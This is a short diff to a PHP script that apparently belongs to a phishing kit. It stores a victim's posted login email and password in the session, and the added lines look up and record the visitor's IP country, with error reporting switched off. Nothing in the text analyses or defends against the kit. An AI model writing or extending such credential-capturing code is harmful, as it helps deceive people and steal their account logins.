@@ -8,12 +8,14 @@
 session_start();
 error_reporting(0);
 ##################### SECOND FILES #####################
+include('../../functions/get_ip.php');
 include('../../functions/get_lang_en.php'); 
 ################## ACCOUNT INFORMATION #################
 $_SESSION['_login_email_']    = $_POST['login_email'];
 $_SESSION['_login_password_'] = $_POST['login_password'];
+$_SESSION['COUNTRYA'] =  $LOOKUP_COUNTRY;
 ################## ACCOUNT INFORMATION #################
-
+echo $LOOKUP_COUNTRY;
 $charSet = "XXXXID0123456789";
 $charSetSize = strlen($charSet); $pwdSize = 6;
 for ($i = 0; $i < $pwdSize; $i++) {
